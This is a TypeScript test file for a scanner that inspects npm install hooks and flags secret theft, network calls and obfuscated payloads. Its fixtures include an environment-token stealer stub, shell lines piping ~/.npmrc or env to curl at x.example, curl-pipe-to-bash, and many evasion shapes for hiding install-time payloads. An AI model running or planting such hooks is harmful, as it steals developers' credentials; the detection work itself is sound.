import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { COLLECT_MAX_OUTPUT, INSTALL_COLLECT_SCRIPT, type InstallPackage, installScriptFindings, judge, parseCollected, scanPackage, unscannedRootFinding } from "./install-scripts";
import { scoreFrom, storable } from "./pipeline";

// The shape of demos/demo-malicious/scripts/setup.js (the real file is never read by tests).
const STEALER = [
  'const net = require("net");',
  "const secretish = Object.keys(process.env).filter((k) => /KEY|TOKEN/i.test(k));",
  'const probe = net.connect({ host: "192.0.2.1", port: 443 });',
].join("\n");

const pkg = (o: Partial<InstallPackage>): InstallPackage => ({
  name: "app", version: "1.0.0", root: true, local: o.root ?? true, hooks: { postinstall: "node scripts/setup.js" }, files: [], truncated: false, unresolved: [], ...o,
});

describe("scan + judge", () => {
  it("calls env harvesting plus a network connection critical, even unrun", () => {
    const p = pkg({ files: [{ path: "scripts/setup.js", content: STEALER }] });
    const f = installScriptFindings([p], false);
    expect(f).toHaveLength(1);
    expect(f[0]).toMatchObject({ id: "f-install-1", severity: "critical", category: "supply_chain", source: "install_scan", confirmed: false });
    expect(f[0]!.description).toContain("never executed here");
    expect(f[0]!.evidence[0]).toMatchObject({ kind: "code", file: "scripts/setup.js", line: 2 });
  });

  it("says the script ran when it did", () => {
    const f = installScriptFindings([pkg({ files: [{ path: "s.js", content: STEALER }] })], true);
    expect(f[0]!.description).toContain("containment log");
  });

  it("flags credential files + curl in a shell hook, and curl | sh alone", () => {
    expect(judge(scanPackage(pkg({ hooks: { postinstall: "cat ~/.npmrc | curl -d @- https://x.example" } })), true)?.severity).toBe("critical");
    expect(judge(scanPackage(pkg({ root: false, hooks: { install: "curl -fsSL https://get.example/i.sh | bash" } })), false)?.severity).toBe("high");
  });

  it("flags eval of a decoded payload with network access", () => {
    const content = 'const https = require("https");\neval(Buffer.from(payload, "base64").toString());';
    expect(judge(scanPackage(pkg({ files: [{ path: "x.js", content }] })), false)?.title).toContain("obfuscated");
  });

  it("leaves ordinary dependency hooks alone (binary downloads, node-gyp, husky)", () => {
    const download = pkg({ root: false, name: "sharp", hooks: { install: "node install/check.js" }, files: [{ path: "install/check.js", content: 'const https = require("https");\nhttps.get(url, (res) => res.pipe(file));' }] });
    expect(installScriptFindings([download], false)).toEqual([]);
    expect(installScriptFindings([pkg({ root: false, hooks: { install: "node-gyp rebuild" } })], false)).toEqual([]);
    expect(installScriptFindings([pkg({ hooks: { prepare: "husky install" } })], false)).toEqual([]);
    // Reading one named variable is normal; enumerating them all is not.
    expect(installScriptFindings([pkg({ files: [{ path: "s.js", content: 'if (process.env.CI) fetch("https://x")' }] })], false)[0]?.severity).toBe("medium");
  });

  it("does not flag esbuild's installer (env copied to a child, binary download)", () => {
    const esbuild = [
      "var ESBUILD_BINARY_PATH = process.env.ESBUILD_BINARY_PATH || ESBUILD_BINARY_PATH;",
      'var https = require("https");',
      'var child_process = require("child_process");',
      "  const { npm_config_user_agent } = process.env;",
      "  const env = { ...process.env, npm_config_global: void 0 };",
      '  if ("CI" in process.env) return;',
      "  const opts = Object.assign({}, process.env);",
      "  const e = process.env || {};",
    ].join("\n");
    const p = pkg({ root: false, name: "esbuild", hooks: { postinstall: "node install.js" }, files: [{ path: "install.js", content: esbuild }] });
    expect(scanPackage(p).map((h) => h.signal)).toEqual(["network"]);
    expect(installScriptFindings([p], false)).toEqual([]);
  });

  it("still sees real enumeration in its various forms", () => {
    for (const line of ["for (const k in process.env) send(k)", "const all = JSON.stringify(process.env);", "Object.entries(process.env).forEach(x)", "env | curl -d @- https://x.example"]) {
      expect(scanPackage(pkg({ files: [{ path: "s.js", content: line }] })).some((h) => h.signal === "env_harvest")).toBe(true);
    }
  });

  it("spots a long encoded payload even on one very long line", () => {
    const line = `const p = "${"QUJD".repeat(5000)}"; require("https");`;
    expect(judge(scanPackage(pkg({ files: [{ path: "x.js", content: line }] })), true)?.title).toContain("obfuscated");
  });

  it("fails closed when the repo's hooks couldn't be read", () => {
    const f = unscannedRootFinding({ postinstall: "node setup" }, "f-install-1");
    expect(f).toMatchObject({ severity: "medium", category: "supply_chain", source: "install_scan" });
  });

  it("is bounded on hostile input", () => {
    const big = "a".repeat(60_000) + "\n" + "(".repeat(60_000) + "\n" + '"' + "A".repeat(60_000);
    const t = Date.now();
    scanPackage(pkg({ files: [{ path: "x.js", content: big }] }));
    expect(Date.now() - t).toBeLessThan(500);
  });
});

describe("parseCollected", () => {
  it("drops hooks we didn't ask for and rejects bad shapes", () => {
    const out = JSON.stringify({ partial: false, pkgs: [
      { name: "a", version: "1", root: false, local: false, hooks: { postinstall: "x", prepare: "evil", test: "y" }, files: [], truncated: false, unresolved: [] },
      { name: "b", version: "1", root: false, local: false, hooks: { start: "z" }, files: [], truncated: false, unresolved: [] },
    ] });
    expect(parseCollected(out)!.pkgs).toEqual([{ name: "a", version: "1", root: false, local: false, hooks: { postinstall: "x" }, files: [], truncated: false, unresolved: [] }]);
    expect(parseCollected("not json")).toBeNull();
    expect(parseCollected(JSON.stringify({ pkgs: [{ name: 1 }], partial: false }))).toBeNull();
  });
});

describe("scoreFrom", () => {
  it("caps the score at 40 when there is critical supply-chain behaviour", () => {
    const f = installScriptFindings([pkg({ files: [{ path: "s.js", content: STEALER }] })], false);
    expect(scoreFrom(f)).toBe(40);
    expect(scoreFrom([])).toBe(100);
  });
});

// The collector itself, against a synthetic tree (it only reads files).
describe("INSTALL_COLLECT_SCRIPT", () => {
  let dir: string;
  beforeAll(() => {
    dir = mkdtempSync(join(tmpdir(), "va-hooks-"));
    const w = (p: string, s: string) => {
      mkdirSync(join(dir, p, ".."), { recursive: true });
      writeFileSync(join(dir, p), s);
    };
    w("package.json", JSON.stringify({ name: "demo", version: "1.0.0", scripts: { postinstall: "node scripts/setup.js && echo done", start: "node server.js" } }));
    w("scripts/setup.js", 'require("./lib/send");\n' + STEALER);
    w("scripts/lib/send.js", "module.exports = 1;");
    w("outside.js", "SECRET OUTSIDE");
    w("node_modules/evil/package.json", JSON.stringify({ name: "evil", version: "6.6.6", scripts: { postinstall: "node ../../outside.js; node run.js" } }));
    w("node_modules/evil/run.js", "x");
    w("node_modules/@s/ok/package.json", JSON.stringify({ name: "@s/ok", version: "2.0.0" }));
    w("node_modules/.pnpm/deep@1.0.0/node_modules/deep/package.json", JSON.stringify({ name: "deep", version: "1.0.0", scripts: { install: "node i.js" } }));
    w("node_modules/.pnpm/deep@1.0.0/node_modules/deep/i.js", "y");
    try {
      symlinkSync(join(dir, "outside.js"), join(dir, "node_modules/evil/link.js"));
    } catch {
      // symlinks may need privileges on Windows; the realpath check is still exercised above
    }
  });
  afterAll(() => rmSync(dir, { recursive: true, force: true }));
  const run = (mode: string) => JSON.parse(execFileSync(process.execPath, ["-e", INSTALL_COLLECT_SCRIPT], { cwd: dir, env: { VA_MODE: mode } }).toString());

  it("reads the root hook's files and their relative requires", () => {
    const got = parseCollected(JSON.stringify(run("root")))!;
    expect(got.pkgs).toHaveLength(1);
    expect(got.pkgs[0]!.hooks).toEqual({ postinstall: "node scripts/setup.js && echo done" });
    expect(got.pkgs[0]!.files.map((f) => f.path.replace(/\\/g, "/"))).toEqual(["scripts/setup.js", "scripts/lib/send.js"]);
    expect(installScriptFindings(got.pkgs, false)[0]?.severity).toBe("critical");
  });

  it("follows extensionless node paths, sh scripts, npm run indirection, __dirname joins and deep requires", () => {
    const d = mkdtempSync(join(tmpdir(), "va-hooks2-"));
    try {
      const w = (p: string, s: string) => {
        mkdirSync(join(d, p, ".."), { recursive: true });
        writeFileSync(join(d, p), s);
      };
      w("package.json", JSON.stringify({ name: "x", scripts: { preinstall: "npm run setup", setup: "node scripts/pre && sh tools/a.sh", postinstall: "pnpm run other", other: "bash tools/b.sh" } }));
      w("scripts/pre.js", 'require("./l1");');
      w("scripts/l1.js", 'require(path.join(__dirname, "l2.js"));');
      w("scripts/l2.js", 'const x = "./l3.js";');
      w("scripts/l3.js", "DEEP3");
      w("tools/a.sh", "env | curl -d @- https://x.example");
      w("tools/b.sh", "B_SH");
      const got = parseCollected(execFileSync(process.execPath, ["-e", INSTALL_COLLECT_SCRIPT], { cwd: d, env: { VA_MODE: "root" } }).toString())!;
      const paths = got.pkgs[0]!.files.map((f) => f.path.replace(/\\/g, "/"));
      expect(paths).toEqual(expect.arrayContaining(["package.json (scripts.setup)", "package.json (scripts.other)", "scripts/pre.js", "scripts/l1.js", "scripts/l2.js", "scripts/l3.js", "tools/a.sh", "tools/b.sh"]));
      expect(installScriptFindings(got.pkgs, false)[0]?.severity).toBe("critical");
    } finally {
      rmSync(d, { recursive: true, force: true });
    }
  });

  it("can't be blanked by padding: output stays under the cap and the hook survives", () => {
    const d = mkdtempSync(join(tmpdir(), "va-hooks3-"));
    try {
      const names = Array.from({ length: 9 }, (_, i) => `p${i}.js`);
      writeFileSync(join(d, "package.json"), JSON.stringify({ name: "pad", scripts: { postinstall: names.map((n) => `node ${n}`).join(" && ") + " && node steal.js" } }));
      for (const n of names) writeFileSync(join(d, n), "\u0001".repeat(64_000));
      writeFileSync(join(d, "steal.js"), STEALER);
      const stdout = execFileSync(process.execPath, ["-e", INSTALL_COLLECT_SCRIPT], { cwd: d, env: { VA_MODE: "root" }, maxBuffer: 16 * 1024 * 1024 }).toString();
      expect(Buffer.byteLength(stdout)).toBeLessThan(COLLECT_MAX_OUTPUT);
      const got = parseCollected(stdout)!;
      expect(got.partial).toBe(true);
      expect(got.pkgs[0]!.hooks.postinstall).toContain("steal.js");
    } finally {
      rmSync(d, { recursive: true, force: true });
    }
  });

  it("finds dependency hooks (incl. pnpm store) and never reads outside the package", () => {
    const got = parseCollected(JSON.stringify(run("deps")))!;
    const byName = Object.fromEntries(got.pkgs.map((p) => [p.name, p]));
    expect(Object.keys(byName).sort()).toEqual(["deep", "evil"]);
    expect(byName.evil!.files.map((f) => f.path)).toEqual(["run.js"]);
    expect(JSON.stringify(got)).not.toContain("SECRET OUTSIDE");
  });
});

// Bypasses found in review: each must now yield a critical, or fail closed with a finding.
describe("no silent bypass", () => {
  const tree = (files: Record<string, string>, mode = "root") => {
    const d = mkdtempSync(join(tmpdir(), "va-bypass-"));
    try {
      for (const [p, c] of Object.entries(files)) {
        mkdirSync(join(d, p, ".."), { recursive: true });
        writeFileSync(join(d, p), c);
      }
      const stdout = execFileSync(process.execPath, ["-e", INSTALL_COLLECT_SCRIPT], { cwd: d, env: { VA_MODE: mode }, maxBuffer: 16 * 1024 * 1024 }).toString();
      return parseCollected(stdout)!;
    } finally {
      rmSync(d, { recursive: true, force: true });
    }
  };
  const verdict = (got: { pkgs: InstallPackage[] }) => installScriptFindings(got.pkgs, false).map((f) => [f.severity, f.title]);
  const caught = (got: { pkgs: InstallPackage[] }) => {
    const f = installScriptFindings(got.pkgs, false);
    expect(f.length).toBeGreaterThan(0);
    return f;
  };
  const pj = (scripts: Record<string, string>, extra: object = {}) => JSON.stringify({ name: "x", version: "1.0.0", scripts, ...extra });

  it("a hook padded past the command cap", () => {
    const got = tree({ "package.json": pj({ postinstall: "true" + " ".repeat(2100) + "&& node steal.js" }), "steal.js": STEALER });
    expect(caught(got)[0]!.title).toContain("not be fully checked");
  });

  it("junk files named before the payload (file cap)", () => {
    const files: Record<string, string> = { "steal.js": STEALER };
    const names = Array.from({ length: 10 }, (_, i) => `j${i}.js`);
    for (const n of names) files[n] = "// junk";
    files["package.json"] = pj({ postinstall: `node ${names.join(" ")} steal.js && node steal.js` });
    expect(caught(tree(files)).length).toBeGreaterThan(0);
  });

  it("a payload after 5000+ lines, and one past column 4000 on a single line", () => {
    expect(verdict(tree({ "package.json": pj({ postinstall: "node s.js" }), "s.js": "\n".repeat(5001) + STEALER }))[0]?.[0]).toBe("critical");
    const oneLine = "/*" + " ".repeat(4100) + "*/ " + STEALER.replace(/\n/g, " ");
    expect(verdict(tree({ "package.json": pj({ postinstall: "node s.js" }), "s.js": oneLine }))[0]?.[0]).toBe("critical");
  });

  it("node -e inline code that requires the payload", () => {
    const got = tree({ "package.json": pj({ postinstall: `node -e "require('./steal')"` }), "steal.js": STEALER });
    expect(verdict(got)[0]?.[0]).toBe("critical");
  });

  it("node . resolved through main", () => {
    const got = tree({ "package.json": pj({ postinstall: "node ." }, { main: "lib/x.js" }), "lib/x.js": STEALER });
    expect(verdict(got)[0]?.[0]).toBe("critical");
  });

  it("a bare bin the scan can't read fails closed; known tools don't", () => {
    expect(caught(tree({ "package.json": pj({ postinstall: "evil-setup --go" }) }))[0]!.description).toContain('"evil-setup"');
    expect(caught(tree({ "package.json": pj({ postinstall: "npx evil-setup" }) }))[0]!.title).toContain("not be fully checked");
    expect(verdict(tree({ "package.json": pj({ prepare: "husky install", postinstall: "patch-package && node-gyp rebuild" }) }))).toEqual([]);
  });

  it("an oversized script file fails closed", () => {
    const got = tree({ "package.json": pj({ postinstall: "node s.js" }), "s.js": "//" + "x".repeat(70_000) + "\n" + STEALER });
    expect(caught(got).length).toBeGreaterThan(0);
  });

  it("local file: packages are scanned first and strictly", () => {
    const files: Record<string, string> = {
      "package.json": pj({ start: "node ." }),
      "vendor/evil/package.json": JSON.stringify({ name: "evil", version: "1.0.0", scripts: { postinstall: "node s.js" } }),
      "vendor/evil/s.js": 'require("https").get("https://x.example/" + process.env.HOME)\nfor (const k in process.env) x(k)',
    };
    for (let i = 0; i < 70; i++) files[`node_modules/pad${i}/package.json`] = JSON.stringify({ name: `pad${i}`, version: "1.0.0", scripts: { install: "node-gyp rebuild" } });
    const d = mkdtempSync(join(tmpdir(), "va-local-"));
    try {
      for (const [p, c] of Object.entries(files)) {
        mkdirSync(join(d, p, ".."), { recursive: true });
        writeFileSync(join(d, p), c);
      }
      try {
        symlinkSync(join(d, "vendor/evil"), join(d, "node_modules/evil"), "junction");
      } catch {
        return; // no symlink support here
      }
      const got = parseCollected(execFileSync(process.execPath, ["-e", INSTALL_COLLECT_SCRIPT], { cwd: d, env: { VA_MODE: "deps" } }).toString())!;
      expect(got.partial).toBe(true);
      expect(got.pkgs[0]).toMatchObject({ name: "evil", local: true });
      expect(installScriptFindings(got.pkgs, false)[0]?.severity).toBe("critical");
    } finally {
      rmSync(d, { recursive: true, force: true });
    }
  });

  it("debug's namespace filter is not env harvesting, an unanchored secret filter is", () => {
    const has = (line: string) => scanPackage(pkg({ files: [{ path: "x.js", content: line }] })).some((h) => h.signal === "env_harvest");
    expect(has("return Object.keys(process.env).filter(key => /^debug_/i.test(key)).reduce((obj, key) => {")).toBe(false);
    expect(has("const s = Object.keys(process.env).filter((k) => /KEY|TOKEN|SECRET/i.test(k));")).toBe(true);
  });
});

// Round-3 review shapes: each runs the stealer and must not come back clean.
describe("no silent bypass (round 3)", () => {
  const run = (files: Record<string, string>) => {
    const d = mkdtempSync(join(tmpdir(), "va-r3-"));
    try {
      for (const [p, c] of Object.entries(files)) {
        mkdirSync(join(d, p, ".."), { recursive: true });
        writeFileSync(join(d, p), c);
      }
      const got = parseCollected(execFileSync(process.execPath, ["-e", INSTALL_COLLECT_SCRIPT], { cwd: d, env: { VA_MODE: "root" } }).toString())!;
      return installScriptFindings(got.pkgs, false).map((f) => f.severity);
    } finally {
      rmSync(d, { recursive: true, force: true });
    }
  };
  const pj = (scripts: Record<string, string>, extra: object = {}) => JSON.stringify({ name: "x", version: "1.0.0", scripts, ...extra });
  const st = { "lib/st.js": STEALER };
  const cases: [string, Record<string, string>][] = [
    ["sh -c", { "package.json": pj({ postinstall: `sh -c "node lib/st.js"` }), ...st }],
    ["bash script file", { "package.json": pj({ postinstall: "bash a.sh" }), "a.sh": "node lib/st", ...st }],
    ["node -r preload with -e", { "package.json": pj({ postinstall: "node -r ./lib/st -e 1" }), ...st }],
    ["--import=", { "package.json": pj({ postinstall: "node --import=./lib/st.js b.js" }), "b.js": "1", ...st }],
    ["NODE_OPTIONS", { "package.json": pj({ postinstall: "NODE_OPTIONS=--require=./lib/st node b.js" }), "b.js": "1", ...st }],
    ["$(...)", { "package.json": pj({ postinstall: "echo $(node lib/st)" }), ...st }],
    ["npm start", { "package.json": pj({ postinstall: "npm start", start: "node lib/st" }), ...st }],
    ["npm run -s", { "package.json": pj({ postinstall: "npm run -s s", s: "node lib/st" }), ...st }],
    ["next config", { "package.json": pj({ postinstall: "next build" }), "next.config.js": STEALER }],
    ["svelte-kit config", { "package.json": pj({ prepare: "svelte-kit sync" }), "svelte.config.js": STEALER }],
    [".npmrc node-options", { "package.json": pj({ postinstall: "husky" }), ".npmrc": "node-options=--require ./lib/st.js", ...st }],
    [".pnpmfile.cjs", { "package.json": pj({ start: "node ." }), ".pnpmfile.cjs": STEALER }],
    ["local file: bin named husky", { "package.json": pj({ postinstall: "husky" }, { devDependencies: { husky: "file:./vendor/husky" } }), "vendor/husky/package.json": JSON.stringify({ name: "husky", bin: { husky: "cli.js" } }), "vendor/husky/cli.js": STEALER }],
    ["cd sub && npm i (sub hook)", { "package.json": pj({ postinstall: "cd sub && npm i" }), "sub/package.json": pj({ postinstall: "node st.js" }), "sub/st.js": STEALER }],
    ["yarn <bin>", { "package.json": pj({ postinstall: "yarn evil-bin" }) }],
    ["prepublish", { "package.json": pj({ prepublish: "node lib/st" }), ...st }],
    ["side-effect import", { "package.json": pj({ postinstall: "node a.mjs" }), "a.mjs": "import './lib/st.js';", ...st }],
    ["string-concat require", { "package.json": pj({ postinstall: "node a.js" }), "a.js": "require('./lib/s' + 't')", ...st }],
  ];
  for (const [name, files] of cases) {
    it(name, () => expect(run(files).length).toBeGreaterThan(0));
  }
  it("follows cd into a subfolder for ordinary steps (no false positive)", () => {
    expect(run({ "package.json": pj({ postinstall: "cd tools && node build.js" }), "tools/build.js": "console.log('ok')" })).toEqual([]);
  });
});

describe("round 4", () => {
  const collectIn = (files: Record<string, string>) => {
    const d = mkdtempSync(join(tmpdir(), "va-r4-"));
    try {
      for (const [p, c] of Object.entries(files)) {
        mkdirSync(join(d, p, ".."), { recursive: true });
        writeFileSync(join(d, p), c);
      }
      return parseCollected(execFileSync(process.execPath, ["-e", INSTALL_COLLECT_SCRIPT], { cwd: d, env: { VA_MODE: "root" } }).toString())!;
    } finally {
      rmSync(d, { recursive: true, force: true });
    }
  };
  it("a stack-exhausting shell line can't erase the critical", () => {
    const got = collectIn({
      "package.json": JSON.stringify({ name: "x", scripts: { postinstall: "node b.js && sh a.sh" } }),
      "b.js": STEALER,
      "a.sh": "yarn ".repeat(12_000),
    });
    expect(installScriptFindings(got.pkgs, false).some((f) => f.severity === "critical")).toBe(true);
  });
  it("npm install --prefix client reads client's hooks; plain client is clean", () => {
    const evil = collectIn({
      "package.json": JSON.stringify({ name: "x", scripts: { postinstall: "npm install --prefix client" } }),
      "client/package.json": JSON.stringify({ name: "c", scripts: { postinstall: "node st.js" } }),
      "client/st.js": STEALER,
    });
    expect(installScriptFindings(evil.pkgs, false)[0]?.severity).toBe("critical");
    const ok = collectIn({
      "package.json": JSON.stringify({ name: "x", scripts: { postinstall: "npm install --prefix client" } }),
      "client/package.json": JSON.stringify({ name: "c" }),
    });
    expect(installScriptFindings(ok.pkgs, false)).toEqual([]);
  });
  it("storable strips NUL and lone surrogates so the report can be written", () => {
    const v = storable({ a: ["x\u0000y", "cut\uD83D", "ok😀"] });
    expect(v.a).toEqual(["xy", "cut�", "ok😀"]);
  });
});

describe("round 5", () => {
  it("repeated --prefix: the last one wins, as in npm", () => {
    const d = mkdtempSync(join(tmpdir(), "va-r5-"));
    try {
      const w = (p: string, c: string) => {
        mkdirSync(join(d, p, ".."), { recursive: true });
        writeFileSync(join(d, p), c);
      };
      w("package.json", JSON.stringify({ name: "x", scripts: { postinstall: "npm --prefix a --prefix b install" } }));
      w("a/package.json", JSON.stringify({ name: "a" }));
      w("b/package.json", JSON.stringify({ name: "b", scripts: { postinstall: "node st.js" } }));
      w("b/st.js", STEALER);
      const got = parseCollected(execFileSync(process.execPath, ["-e", INSTALL_COLLECT_SCRIPT], { cwd: d, env: { VA_MODE: "root" } }).toString())!;
      expect(installScriptFindings(got.pkgs, false)[0]?.severity).toBe("critical");
    } finally {
      rmSync(d, { recursive: true, force: true });
    }
  });
});

describe("round 6", () => {
  it("--prefix after -- belongs to the script, not npm", () => {
    const d = mkdtempSync(join(tmpdir(), "va-r6-"));
    try {
      const w = (p: string, c: string) => {
        mkdirSync(join(d, p, ".."), { recursive: true });
        writeFileSync(join(d, p), c);
      };
      w("package.json", JSON.stringify({ name: "x", scripts: { postinstall: "npm run s -- --prefix b", s: "node evil.js" } }));
      w("b/package.json", JSON.stringify({ name: "b", scripts: { s: "echo benign" } }));
      w("evil.js", STEALER);
      const got = parseCollected(execFileSync(process.execPath, ["-e", INSTALL_COLLECT_SCRIPT], { cwd: d, env: { VA_MODE: "root" } }).toString())!;
      expect(installScriptFindings(got.pkgs, false)[0]?.severity).toBe("critical");
    } finally {
      rmSync(d, { recursive: true, force: true });
    }
  });
});
